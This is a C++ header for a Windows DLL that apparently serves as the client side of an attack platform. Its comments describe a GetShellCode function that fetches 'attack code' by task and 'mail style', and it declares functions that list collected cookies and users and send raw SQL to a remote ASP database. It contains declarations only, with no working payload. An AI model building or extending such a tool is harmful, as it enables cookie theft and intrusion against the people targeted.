
// The following ifdef block is the standard way of creating macros which make exporting 
// from a DLL simpler. All files within this DLL are compiled with the WEBDATA_EXPORTS
// symbol defined on the command line. this symbol should not be defined on any project
// that uses this DLL. This way any other project whose source files include this file see 
// WEBDATA_API functions as being imported from a DLL, wheras this DLL sees symbols
// defined with this macro as being exported.

#if !defined(WEBDATA_H__F89D7D90_A2C7_4BEA_A1CC_C5F422422E7C__INCLUDED_)
#define WEBDATA_H__F89D7D90_A2C7_4BEA_A1CC_C5F422422E7C__INCLUDED_

#ifdef WEBDATA_EXPORTS
#define WEBDATA_API __declspec(dllexport)
#else
#define WEBDATA_API __declspec(dllimport)
#endif

#include "stdafx.h"
#include <afxinet.h> //CInternetSession SendURL
#include <afx.h>	//cstring 
#include <string>

#include <afxcmn.h> //CListCtrl

#import "msxml.dll"
using namespace MSXML;

//导入ADO的动态连接库,不要命名空间,将EOF改为rsEOF
#import "c:\Program Files\Common Files\System\ado\msado15.dll" no_namespace rename("EOF","adoEOF") rename("BOF","adoBOF")

class CADOWeb  //webdata
{
public:
	_ConnectionPtr m_pConnection;
	_RecordsetPtr m_pRecordset;
public:
	//bool Addinf();
	CADOWeb(); //构造函数
	virtual ~CADOWeb(); //析构函数
	 //初始化连接数据库
	bool OnInitADOConnect();
	_RecordsetPtr&GetRecordSet(_bstr_t bstrSQL); //执行SQL命令，返回记录集
	bool ExecuteSQL(_bstr_t bstrSQL); //执行SQL命令，无返回记录集
	void ExitConnect(); //断开数据库连接

};

using namespace std;//命名空间

#ifdef _WIN32
#pragma warning(disable:4514)
#endif

class Base64
{
public:
    static inline bool is_base64(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));};
    static std::string base64_encode(unsigned char const* , unsigned int len);
    static std::string base64_decode(std::string const& s);
};

static const std::string base64_chars = 
"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"+/";



// This class is exported from the webdata.dll
/*
本DLL的功能：提供客户端访问ASP程序及ASP网站数据库的接口
GetShellCode 函数获取攻击代码
login  登录ASP网站
logout 退出ASP网站
*/
class WEBDATA_API  CWebData {
public:
	CWebData();//初始化
	~CWebData();
				
public:
	int login(const CString strSerURL,const CString strLogname,const CString strPassword);//登录、
	void logout(const CString strSerURL,int nLogID);
	CStringA GetShellCode(const int nTaskID,const TCHAR * pName,const TCHAR * pMailStyle,const int nGetCodeStyle);  //获取攻击代码

public:
//	int			logID;				//登录ID
	int			m_nNews;				//存储新信息的条数
	CString		m_strSerURL;			//web服务器地址
	CADOWeb		m_cADOweb;				//操作本地数据库对象，要包含ADOConn.h头函数
	CStringA	m_strArecv;				//存放返回信息
	
				//退出
	bool GetNews(bool bload = 0);	//获取更新数据的条数，并bload=1时下载新信息


public:
	bool WebUpToMDB();				//更新全部数据到本地数据库
	void SendSql(CString SQL);		//直接执行SQL语句到网络数据库
	bool delID(TCHAR * form,int ID);	//删除指定表中的指定项	


public:
	bool viewinf(CListCtrl &m_list);          //直接显示
	bool viewinfformMDB(CListCtrl &m_list,const int nLogID);   //从数据库读取
	bool viewjsweb(CListCtrl &m_list,const int nLogID);
	bool viewuser(CListCtrl &m_list,const int nLogID);
	bool viewcook(CListCtrl &m_list,const int nLogID);
	bool viewcookformMDB(CListCtrl &m_list,const int nLogID);

protected:

	CStringA strxml;					//存储XML数据

	void SendURL(CString strurl,bool brecv); //发送ASP请求，brecv是否显示返回数据，m_strArecv保存返回数据
	bool LoadXML(int startID = 0);	//从WEB.mdb上次更新记录之后下载数据
	void CreateXML(TCHAR * path);	//写XML文件
	bool WriteXMLtoMDB(TCHAR * path,TCHAR * rss,TCHAR * form,TCHAR * title[15],int listnub);//将XML数据写入数据库
	bool ReadXML(TCHAR * path,TCHAR * title[15],int len,TCHAR * rss,CListCtrl &m_list); //读取XML到listctrl控件

									//读取指定的XML文件，并显示在m_list中
	// TODO: add your methods here.
};


#endif // !defined(WEBDATA_H__F89D7D90_A2C7_4BEA_A1CC_C5F422422E7C__INCLUDED_)


